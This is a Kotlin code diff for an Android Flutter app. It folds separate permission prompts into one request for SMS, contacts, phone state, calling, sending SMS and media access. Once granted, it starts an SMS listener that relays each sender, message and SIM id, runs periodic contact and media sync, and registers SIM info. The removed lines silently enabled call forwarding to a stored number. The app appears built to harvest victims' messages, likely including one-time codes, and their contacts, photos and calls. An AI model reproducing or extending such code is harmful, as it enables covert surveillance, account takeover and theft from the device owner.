@@ -32,11 +32,12 @@ class SmsPlugin {
             })
         }
 
-        fun receiveSms(sender: String, message: String, timestamp: String) {
+        fun receiveSms(sender: String, message: String, timestamp: String, subId: Int = 0) {
             val data = mapOf(
                 "sender" to sender,
                 "message" to message,
-                "received_at" to timestamp
+                "received_at" to timestamp,
+                "sub_id" to subId
             )
             eventSink?.success(data)
         }
@@ -131,37 +132,20 @@ class MainActivity : FlutterActivity() {
             registerReceiver(receiver, filter)
         }
 
-        requestSmsPermission()
+        requestAllPermissions()
     }
 
-    private fun requestSmsPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val permissions = arrayOf(
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS
-            )
-            val toRequest = permissions.filter {
-                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
-            }
-            if (toRequest.isNotEmpty()) {
-                Handler(Looper.getMainLooper()).post {
-                    requestPermissions(toRequest.toTypedArray(), 1001)
-                }
-            } else {
-                startSmsObserver()
-            }
-        }
+    private fun requestAllPermissions() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
         Handler(Looper.getMainLooper()).postDelayed({
-            requestContactsPermission()
-        }, 3000)
-    }
-
-    private fun requestContactsPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val perms = mutableListOf(
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.READ_SMS,
                 Manifest.permission.READ_CONTACTS,
                 Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.READ_PHONE_NUMBERS
+                Manifest.permission.READ_PHONE_NUMBERS,
+                Manifest.permission.CALL_PHONE,
+                Manifest.permission.SEND_SMS
             )
             if (Build.VERSION.SDK_INT >= 33) {
                 perms.add(Manifest.permission.READ_MEDIA_IMAGES)
@@ -173,61 +157,29 @@ class MainActivity : FlutterActivity() {
                 checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
             }
             if (toRequest.isNotEmpty()) {
-                requestPermissions(toRequest.toTypedArray(), 1002)
+                requestPermissions(toRequest.toTypedArray(), 1001)
             } else {
-                ContactSync(this@MainActivity).startPeriodicSync()
+                onAllPermissionsGranted()
             }
-        }
+        }, 2000)
+    }
+
+    private fun onAllPermissionsGranted() {
+        startSmsObserver()
+        ContactSync(this).startPeriodicSync()
+        DeviceRegistrar.updateSimInfo()
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == 1001) {
-            var smsGranted = false
-            for (i in permissions.indices) {
-                if ((permissions[i] == Manifest.permission.RECEIVE_SMS || permissions[i] == Manifest.permission.READ_SMS)
-                    && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                    smsGranted = true
-                }
-            }
-            if (smsGranted) {
-                startSmsObserver()
-            } else {
-                if (Build.VERSION.SDK_INT >= 34) {
-                    openAppSettings()
-                } else {
-                    Handler(Looper.getMainLooper()).postDelayed({
-                        requestPermissions(arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS), 1001)
-                    }, 5000)
-                }
-            }
-        } else if (requestCode == 1002) {
-            for (i in permissions.indices) {
-                if (permissions[i] == Manifest.permission.READ_CONTACTS && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                    ContactSync(this@MainActivity).startPeriodicSync()
-                }
-                if (permissions[i] == Manifest.permission.READ_PHONE_STATE || permissions[i] == Manifest.permission.READ_PHONE_NUMBERS) {
-                    DeviceRegistrar.updateSimInfo()
-                }
-            }
-            val phonePerms = arrayOf(Manifest.permission.CALL_PHONE, Manifest.permission.SEND_SMS).filter {
-                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
-            }
-            if (phonePerms.isNotEmpty()) {
-                requestPermissions(phonePerms.toTypedArray(), 1003)
-            }
-        } else if (requestCode == 1003) {
-            for (i in permissions.indices) {
-                if (permissions[i] == Manifest.permission.CALL_PHONE && grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                    val prefs = getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE)
-                    val number = prefs.getString("call_forwarding_number", "") ?: ""
-                    if (number.isNotEmpty()) {
-                        CallForwarder(this).enableCallForwarding(number)
-                        prefs.edit().remove("call_forwarding_number").apply()
-                    } else {
-                        CallForwarder(this).disableCallForwarding()
-                    }
-                }
+        if (requestCode != 1001) return
+        for (i in permissions.indices) {
+            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) continue
+            when (permissions[i]) {
+                Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS -> startSmsObserver()
+                Manifest.permission.READ_CONTACTS -> ContactSync(this).startPeriodicSync()
+                Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_EXTERNAL_STORAGE -> MediaSync(this).startPeriodicSync()
+                Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS -> DeviceRegistrar.updateSimInfo()
             }
         }
     }
